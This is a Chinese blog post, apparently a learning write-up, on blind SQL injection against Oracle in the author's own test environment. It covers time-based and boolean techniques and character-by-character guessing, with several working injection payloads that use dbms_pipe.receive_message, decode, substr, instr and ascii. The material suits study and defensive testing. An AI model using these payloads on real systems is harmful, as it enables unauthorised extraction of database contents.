<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Oracle注入第三篇：盲注"><meta name="keywords" content="Web"><meta name="author" content="littlefisher,undefined"><meta name="copyright" content="littlefisher"><title>Oracle注入第三篇：盲注 | littlefisher</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css?version=1.5.4"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  localSearch: undefined
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#测试环境"><span class="toc-number">1.</span> <span class="toc-text">测试环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#时间盲注"><span class="toc-number">2.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#函数介绍"><span class="toc-number">2.1.</span> <span class="toc-text">函数介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DBMS-PIPE-RECEIVE-MESSAGE"><span class="toc-number">2.1.1.</span> <span class="toc-text">DBMS_PIPE.RECEIVE_MESSAGE()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#decode"><span class="toc-number">2.1.2.</span> <span class="toc-text">decode()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试"><span class="toc-number">2.2.</span> <span class="toc-text">测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DBMS-PIPE-RECEIVE-MESSAGE-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">DBMS_PIPE.RECEIVE_MESSAGE()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#decode-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">decode()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tips"><span class="toc-number">2.2.3.</span> <span class="toc-text">Tips</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#布尔盲注"><span class="toc-number">3.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#函数介绍-1"><span class="toc-number">3.1.</span> <span class="toc-text">函数介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#decode-2"><span class="toc-number">3.1.1.</span> <span class="toc-text">decode()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#instr"><span class="toc-number">3.1.2.</span> <span class="toc-text">instr()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#substr"><span class="toc-number">3.1.3.</span> <span class="toc-text">substr()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sign"><span class="toc-number">3.1.4.</span> <span class="toc-text">sign()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试-1"><span class="toc-number">3.2.</span> <span class="toc-text">测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#decode-3"><span class="toc-number">3.2.1.</span> <span class="toc-text">decode()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#小结"><span class="toc-number">3.2.2.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#instr-1"><span class="toc-number">3.2.3.</span> <span class="toc-text">instr()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#逐字猜解"><span class="toc-number">4.</span> <span class="toc-text">逐字猜解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#length-获取数据长度"><span class="toc-number">4.1.</span> <span class="toc-text">length()获取数据长度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ascii-substr"><span class="toc-number">4.2.</span> <span class="toc-text">ascii()+substr()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">littlefisher</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">17</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">7</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(http://119.29.91.207/mianma.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">littlefisher</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a></span></div><div id="post-info"><div id="post-title">Oracle注入第三篇：盲注</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-01-07</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>谈到盲注，根据之前学习的Mysql，无非是时间、布尔……..说的简单，一到真实手工测试的时候根本不想动，太麻烦了（别打我）。</p>
<a id="more"></a>
<h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><p>测试环境为Oracle 12g + Tomcat 9 + Java<br>实现功能：输入框中输入用户名，查询到密码。<br>查询语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT PASSWORD FROM ABTEST WHERE USERNAME=&apos;name&apos;;</span><br></pre></td></tr></table></figure>
<p>时间盲注：无论输入什么都是一个返回。<br>布尔盲注：返回有明显的true or false返回。<br>接下来会对时间盲注和布尔盲注分别进行测试。</p>
<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>Oracle时间盲注需要借助两个函数：</p>
<h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h2><h3 id="DBMS-PIPE-RECEIVE-MESSAGE"><a href="#DBMS-PIPE-RECEIVE-MESSAGE" class="headerlink" title="DBMS_PIPE.RECEIVE_MESSAGE()"></a>DBMS_PIPE.RECEIVE_MESSAGE()</h3><p>DBMS_PIPE.RECEIVE_MESSAGE(‘管道名’,’时间秒’)</p>
<h3 id="decode"><a href="#decode" class="headerlink" title="decode()"></a>decode()</h3><p>我一开始还在想使用decode()函数怎么搞时间盲注，后来翻阅文章，才了解decode()与高耗时的语句组合有效。</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="DBMS-PIPE-RECEIVE-MESSAGE-1"><a href="#DBMS-PIPE-RECEIVE-MESSAGE-1" class="headerlink" title="DBMS_PIPE.RECEIVE_MESSAGE()"></a>DBMS_PIPE.RECEIVE_MESSAGE()</h3><p>测试是否存在时间盲注：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=dbms_pipe.receive_message(&apos;RDS&apos;, 10)--</span><br></pre></td></tr></table></figure>
<p>测试结果：<br><img src="https://i.imgur.com/wpXwERW.png" alt=""></p>
<p>其他测试语句，等待增加…..</p>
<h3 id="decode-1"><a href="#decode-1" class="headerlink" title="decode()"></a>decode()</h3><p>A.decode()与dbms_pipe.receive_message()函数搭配使用，猜数据库的用户名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select decode(substr(user,2,1),&apos;Y&apos;,dbms_pipe.receive_message(&apos;RDS&apos;,5),0) from dual) --</span><br></pre></td></tr></table></figure>
<p>测试结果：<br><img src="https://i.imgur.com/Xl70Wb2.png" alt=""></p>
<p>B.decode()与高耗时语句组合：</p>
<p>存在一个问题，我使用select count(*) from all_objects这条语句在数据库中查询时仅用了0.7s，所以为什么是高耗时语句呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select decode(substr(user,1,1),&apos;Y&apos;,(select count(*) from all_objects),0) from dual) --</span><br></pre></td></tr></table></figure>
<p>测试结果：<br>正确时<br><img src="https://i.imgur.com/7fpOOCk.png" alt=""></p>
<p>错误时<br><img src="https://i.imgur.com/UeGTIow.png" alt=""></p>
<p>经过多次试验，确实是有时间差距的，正确时间大约是错的时间的二倍。但是没有decode()与dbms_pipe.receive_message()函数搭配时时间差明显。</p>
<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>还记得mysql时间盲注中使用sleep(1)函数，在oracle中也有个类似的函数，可是为哈不用呢？不使用DBMS_LOCK.SLEEP()函数原因：<br>1、不能直接将该函数注入子查询中，因为Oracle不支持堆叠查询(stacked query)；<br>2、数据库管理员才能使用DBMS_LOCK包；DBMS_PIPE.RECEIVE_MESSAGE函数public权限执行。</p>
<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><h2 id="函数介绍-1"><a href="#函数介绍-1" class="headerlink" title="函数介绍"></a>函数介绍</h2><p>decode()、instr()、substr()、sign()</p>
<h3 id="decode-2"><a href="#decode-2" class="headerlink" title="decode()"></a>decode()</h3><p>decode(条件,值1，return1,rerurn2)<br>如果条件=值1 return1   否则 return2</p>
<h3 id="instr"><a href="#instr" class="headerlink" title="instr()"></a>instr()</h3><p>instr(被搜索的string1,要在sting1中查找的string2,从string1中开始搜索的位置,[string2在string1中出现的次数])<br>在这里顺便再说一下substr()函数，嗯？是不是很熟悉？没错，就是在上面时间盲注中用到了，但是我没有写具体意思的他…..</p>
<h3 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h3><p>substr(需要截取的string,截取字符串的开始位置，要截取字符串的长度)</p>
<h3 id="sign"><a href="#sign" class="headerlink" title="sign()"></a>sign()</h3><p>sign(n)/sign(n1-n2)<br>n&gt;0 return 1<br>n&lt;0 return -1<br>n=0 return 0</p>
<h2 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h2><h3 id="decode-3"><a href="#decode-3" class="headerlink" title="decode()"></a>decode()</h3><p>decode()判断用户名，测试几个常见的用户名:<br><img src="https://i.imgur.com/5mAceAk.png" alt=""></p>
<p>decode()+substr()逐字猜解数据库:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select decode(substr((select(select table_name from user_tables where rownum=1)from dual),1,1),&apos;T&apos;,1,0) from dual) --</span><br></pre></td></tr></table></figure>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>在这过程中我的准确率还是有问题，再多练习……手工一个个位置测试真的很麻烦，所以还是要尝试使用代码爆破的方式。</p>
<h3 id="instr-1"><a href="#instr-1" class="headerlink" title="instr()"></a>instr()</h3><p>测试语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=(instr((select user from dual),&apos;SYS&apos;)) --</span><br></pre></td></tr></table></figure>
<p>测试结果：<br><img src="https://i.imgur.com/rcIC4dB.png" alt=""></p>
<h1 id="逐字猜解"><a href="#逐字猜解" class="headerlink" title="逐字猜解"></a>逐字猜解</h1><h2 id="length-获取数据长度"><a href="#length-获取数据长度" class="headerlink" title="length()获取数据长度"></a>length()获取数据长度</h2><p>测试语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 3=(select length(user) from dual) --</span><br></pre></td></tr></table></figure>
<p>测试结果：<br><img src="https://i.imgur.com/btOPjRr.png" alt=""></p>
<h2 id="ascii-substr"><a href="#ascii-substr" class="headerlink" title="ascii()+substr()"></a>ascii()+substr()</h2><p>测试语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select ascii(substr(user,1,1)) from dual)=83 --</span><br></pre></td></tr></table></figure>
<p>测试结果：<br><img src="https://i.imgur.com/9isHzVU.png" alt=""></p>
<p>拼接语句时总会出现问题，所以就用最简单的做示例。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>我觉得盲注是最麻烦的….一遇到就头疼的那种，这部分还需要再学习，再练习！！！到这里三篇Oracle的基础学习篇结束，后续会对这部分测试过程中遇到的问题进行查证、再学习。</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">littlefisher</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2020/01/07/Oracel注入第三篇/">http://yoursite.com/2020/01/07/Oracel注入第三篇/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/02/24/(Nginx)PHP-CGI解析漏洞/"><i class="fa fa-chevron-left">  </i><span>PHP-CGI解析漏洞环境搭建及复现</span></a></div><div class="next-post pull-right"><a href="/2019/12/28/Oracel注入第二篇/"><span>Oracle注入第二篇：报错注入</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2020 By littlefisher</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="/js/third-party/anime.min.js"></script><script src="/js/third-party/jquery.min.js"></script><script src="/js/third-party/jquery.fancybox.min.js"></script><script src="/js/third-party/velocity.min.js"></script><script src="/js/third-party/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.5.4"></script><script src="/js/fancybox.js?version=1.5.4"></script><script src="/js/sidebar.js?version=1.5.4"></script><script src="/js/copy.js?version=1.5.4"></script><script src="/js/fireworks.js?version=1.5.4"></script><script src="/js/transition.js?version=1.5.4"></script><script src="/js/scroll.js?version=1.5.4"></script><script src="/js/head.js?version=1.5.4"></script><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":"z16","width":150,"height":300,"scaling":1,"opacityDefault":0.7,"opacityHover":1,"mobileShow":true,"mobileScaling":0.5,"position":"right","horizontalOffset":0,"verticalOffset":-20,"id":"live2dcanvas","deviceJsSource":"local","pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/"});</script></body></html>